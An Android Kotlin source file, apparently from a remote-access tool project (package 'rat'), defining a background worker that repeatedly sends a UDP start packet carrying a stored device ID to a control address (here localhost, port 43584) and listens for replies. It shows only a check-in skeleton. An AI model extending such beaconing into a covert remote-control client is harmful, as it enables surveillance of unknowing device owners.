package ru.awawa.rat.worker

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import kotlinx.coroutines.*
import ru.awawa.rat.helper.Preferences
import ru.awawa.rat.worker.helper.State
import ru.awawa.rat.worker.helper.protocol.StartPacket
import java.net.*


class BackgroundWorker(context: Context, workerParams: WorkerParameters):
        Worker(context, workerParams) {

    companion object {
        private const val TAG = "BackgroundWorker"
    }

    private var workerRunning = false

    private val socket = DatagramSocket()
    private val state = State()

    override fun doWork(): Result {
        this.state.connect(InetAddress.getByName("127.0.0.1"))
        socket.soTimeout = 1

        val buffer = ByteArray(256)
        val rcvPacket = DatagramPacket(buffer, 256)

        while (state.running) {
            try {
                socket.receive(rcvPacket)
            } catch (ex: SocketTimeoutException) {
                this.sleep()
            }
        }

        return Result.success()
    }

    override fun onStopped() {
        super.onStopped()
        this.state.running = false
    }


    private fun sleep() {

        if (state.connectionState == State.ConnectionState.CONNECTING) {
            val buffer = StartPacket(Preferences.get(Preferences.PreferencesField.ID) ?: "").data
            val packet = DatagramPacket(buffer, buffer.size)
            packet.address = state.connectionAddress
            packet.port = 43584

            socket.send(packet)
        }

        Log.w(TAG, "Nothing received...")
        Thread.sleep(1000)
    }
}